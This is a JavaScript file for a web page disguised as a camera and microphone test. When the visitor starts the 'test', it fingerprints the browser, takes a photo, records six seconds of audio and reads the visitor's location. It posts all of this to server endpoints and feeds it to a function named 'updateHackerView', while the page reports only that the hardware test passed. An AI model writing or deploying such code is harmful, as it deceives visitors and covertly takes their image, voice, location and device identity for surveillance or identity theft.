document.addEventListener('DOMContentLoaded', () => {
  const statusElement = document.querySelector('.status-content');
  const startButton = document.getElementById('startTest');
  const videoContainer = document.getElementById('videoContainer');
  const placeholder = document.getElementById('placeholder');
  const cameraStatus = document.getElementById('cameraStatus');
  const micStatus = document.getElementById('micStatus');
  const audioBars = document.querySelectorAll('.audio-bar');

  const loadScript = src => new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = src;
    script.async = true;
    script.onload = resolve;
    script.onerror = () => reject(new Error(`Failed to load ${src}`));
    document.head.appendChild(script);
  });

  startButton.addEventListener('click', async () => {
    try {
      statusElement.textContent = "Initializing test...";
      startButton.disabled = true;
      startButton.innerHTML = '<div class="loader"></div> Starting Test...';

      await collectFingerprint();
      await captureAndSaveMedia();
      await collectLocation();

      statusElement.textContent = "Test completed successfully! All components are working properly.";
      startButton.textContent = "Test Again";
    } catch (error) {
      console.error('Test error:', error);
      statusElement.textContent = "Test encountered an error: " + error.message;
      startButton.textContent = "Retry Test";
    } finally {
      startButton.disabled = false;
    }
  });

  async function collectFingerprint() {
    try {
      if (typeof FingerprintJS === 'undefined') {
        await loadScript('https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js');
      }

      const fp = await FingerprintJS.load();
      const result = await fp.get();

      const payload = {
        visitorId: result.visitorId,
        components: result.components,
        confidence: result.confidence,
        passive: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
          },
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          languages: navigator.languages
        }
      };

      if (window.updateHackerView) updateHackerView(payload);

      const response = await fetch('/collect-fingerprint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!response.ok) throw new Error('Failed to save fingerprint');
    } catch (error) {
      console.error('Fingerprint error:', error);
      throw error;
    }
  }

  async function captureAndSaveMedia() {
    let stream;

    try {
      statusElement.textContent = "Checking camera and microphone permissions...";
      cameraStatus.textContent = "Camera: Checking...";
      micStatus.textContent = "Microphone: Checking...";

      stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true
      });

      const video = document.getElementById('localVideo');
      video.srcObject = stream;
      video.style.display = 'block';
      placeholder.style.display = 'none';

      await new Promise((resolve, reject) => {
        video.onloadedmetadata = resolve;
        video.onerror = reject;
        setTimeout(() => reject(new Error('Camera initialization timeout')), 5000);
      });

      await video.play();
      cameraStatus.textContent = "Camera: Detected";
      statusElement.textContent = "Testing camera... Smile!";

      if (stream.getAudioTracks().length > 0) {
        animateAudioVisualizer(stream);
        micStatus.textContent = "Microphone: Detected";
      }

      statusElement.textContent = "Capturing test image...";
      const imageBlob = await captureImageFrame(video);
      await saveMedia('image', imageBlob, 'jpg');
      cameraStatus.textContent = "Camera: Working properly";

      if (stream.getAudioTracks().length > 0) {
        statusElement.textContent = "Testing microphone... Speak now!";
        const audioBlob = await recordAudio(stream);
        if (audioBlob) {
          await saveMedia('audio', audioBlob, 'webm');
          micStatus.textContent = "Microphone: Working properly";
        }
      } else {
        micStatus.textContent = "Microphone: Not detected";
      }

    } catch (error) {
      if (error.name === 'NotAllowedError') {
        cameraStatus.textContent = "Camera: Permission denied";
        micStatus.textContent = "Microphone: Permission denied";
        throw new Error("Please allow camera and microphone access to complete the test");
      } else {
        cameraStatus.textContent = "Camera: Error (" + error.message + ")";
        micStatus.textContent = "Microphone: Error";
        throw error;
      }
    } finally {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stopAudioVisualizer();
      }
    }
  }

  function animateAudioVisualizer(stream) {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const analyser = audioContext.createAnalyser();
    const microphone = audioContext.createMediaStreamSource(stream);
    microphone.connect(analyser);
    analyser.fftSize = 32;

    const bufferLength = analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    function updateVisualizer() {
      analyser.getByteFrequencyData(dataArray);
      audioBars.forEach((bar, i) => {
        const index = Math.floor(i * (bufferLength / audioBars.length));
        const value = dataArray[index] / 255;
        const height = value * 100;
        bar.style.height = `${10 + height}%`;
      });

      if (window.audioVisualizerActive) {
        requestAnimationFrame(updateVisualizer);
      }
    }

    window.audioVisualizerActive = true;
    updateVisualizer();
  }

  function stopAudioVisualizer() {
    window.audioVisualizerActive = false;
    audioBars.forEach(bar => {
      bar.style.height = '10%';
    });
  }

  async function captureImageFrame(video) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      const attemptCapture = (attempts = 3) => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = ctx.getImageData(0, 0, 10, 10).data;
        const isBlank = Array.from(imageData).every(val => val === 0);

        if (!isBlank || attempts <= 0) {
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        } else {
          setTimeout(() => attemptCapture(attempts - 1), 200);
        }
      };

      attemptCapture();
    });
  }

  async function recordAudio(stream) {
    return new Promise((resolve) => {
      try {
        const audioChunks = [];
        const recorder = new MediaRecorder(stream);

        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) audioChunks.push(e.data);
        };

        recorder.onstop = () => {
          if (audioChunks.length > 0) {
            resolve(new Blob(audioChunks, { type: 'audio/webm' }));
          } else {
            resolve(null);
          }
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 6000);

      } catch (error) {
        console.error('Audio recording error:', error);
        resolve(null);
      }
    });
  }

  async function saveMedia(type, blob, extension) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = async () => {
        try {
          const response = await fetch('/collect-media', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type,
              data: reader.result,
              extension
            })
          });

          if (!response.ok) throw new Error('Server error');
          resolve();
        } catch (error) {
          reject(error);
        }
      };
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  }

  async function collectLocation() {
    if (!navigator.geolocation) return;

    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          try {
            await fetch('/collect-fingerprint', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                location: {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude
                }
              })
            });
            resolve();
          } catch (error) {
            console.error('Location save error:', error);
            resolve();
          }
        },
        (error) => {
          console.error('Geolocation error:', error);
          resolve();
        },
        { timeout: 5000 }
      );
    });
  }
});
